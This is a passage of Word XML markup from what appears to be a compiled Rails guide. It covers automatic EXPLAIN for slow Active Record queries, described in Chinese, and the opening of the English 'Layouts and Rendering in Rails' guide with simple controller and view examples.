        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="698EEC35" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19DDB5AA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1527520968"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.active_record.auto_explain_threshold_in_seconds</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B08A8F6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果设置为一个数字，那一个超过这些时间（以秒为单位）的查询就会自动触发一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 并写入日志。在 relation 的计算中，这个阈值是与获取记录的总时间相比较的。所以，一个 relation 的计算就像是一个工作单位，不管它是不是实现预先加载而涉及了多个查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0646BAF0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">阈值为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 则关闭了自动执行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627E4D4C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">默认情况下，开发模式下的阈值为 0.5 秒，测试和生产模式下为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22683AB9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">不管阈值是不是设为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，如果没有日志系统，自动 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 都不起作用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A18415" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">22.1.1 禁用自动 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3654C7EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">自动 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 可以用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.silence_auto_explain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来选择性的禁用。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="099B925C" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D86FF67" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord.silence_auto_explain do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F00FB9D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # 这里不会触发自动 EXPLAIN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13C1B724" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="304A8254" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这在你知道某个查询很慢但是合理时是非常有用的，就像管理员页面某个重量级的报表等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35769F1E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">正如名字所言， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence_auto_explain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 只会禁用自动 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。直接调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Relation#explain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 依然是可用的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C30A22" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">22.2 深入了解 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6871BA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">深入了解 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EXPLAIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的输出已经超出本篇指导的范围了，以下的链接或许对你有帮助：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DFA8F6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">SQLite3: </w:t>
      </w:r>
      <w:hyperlink r:id="rId285" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>QUERY</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>PLAN</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2361CEA5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">MySQL: </w:t>
      </w:r>
      <w:hyperlink r:id="rId286" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Output Format</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7A414B48" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">PostgreSQL: </w:t>
      </w:r>
      <w:hyperlink r:id="rId287" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Using </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35F203F7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="005D6D6E"/>
    <w:p w14:paraId="208EE97B" w14:textId="7E3BA3C7" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="002725A5">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259FE9DA" w14:textId="171AF244" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3.1、</w:t>
      </w:r>
      <w:hyperlink r:id="rId288" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails中的布局与渲染</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="02DB25B1" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009012A1">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>Layouts and Rendering in Rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C41B472" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>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This guide covers the basic layout features of Action Controller and Action View. By referring to this guide, you will be able to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB43548" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>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Use the various rendering methods built into Rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6D0104" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>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Create layouts with multiple content sections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CCEC04" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>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Use partials to DRY up your views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27872F25" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>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Use nested layouts (sub-templates)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0828622E" w14:textId="77777777" w:rsidR="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="104B39FC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Overview: How the Pieces Fit Together</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FC1FA9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide focuses on the interaction between Controller and View in the Model-View-Controller triangle. As you know, the Controller is responsible for orchestrating the whole process of handling a request in Rails, though it normally hands off any heavy code to the Model. But then, when it’s time to send a response back to the user, the Controller hands things off to the View. It’s that handoff that is the subject of this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53576930" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In broad strokes, this involves deciding what should be sent as the response and calling an appropriate method to create that response. If the response is a full-blown view, Rails also does some extra work to wrap the view in a layout and possibly to pull in partial views. You’ll see all of those paths later in this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6B4BA0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Creating Responses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E411643" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">From the controller’s point of view, there are three ways to create an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FFD9B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to create a full response to send back to the browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4FFEFF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to send an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> redirect status code to the browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF65B59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to create a response consisting solely of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> headers to send back to the browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481B2F96" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>I’ll cover each of these methods in turn. But first, a few words about the very easiest thing that the controller can do to create a response: nothing at all.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FD678E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Rendering by Default: Convention Over Configuration in Action</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757A9929" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You’ve heard that Rails promotes “convention over configuration”. Default rendering is an excellent example of this. By default, controllers in Rails automatically render views with names that correspond to valid routes. For example, if you have this code in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BooksController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="69CB6446" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B52AD48" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BooksController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DCE98DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AD2B349" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And the following in your routes file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1920"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4698395A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4034D9E7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1722289003"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>resources :books</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58DD01A5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And you have a view file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/books/index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3720"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="38CF26E0" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3194E983" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="432091834"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Books are coming soon!&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E132282" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails will automatically render </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/books/index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when you navigate to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and you will see “Books are coming soon!” on your screen.</w:t>
      </w:r>
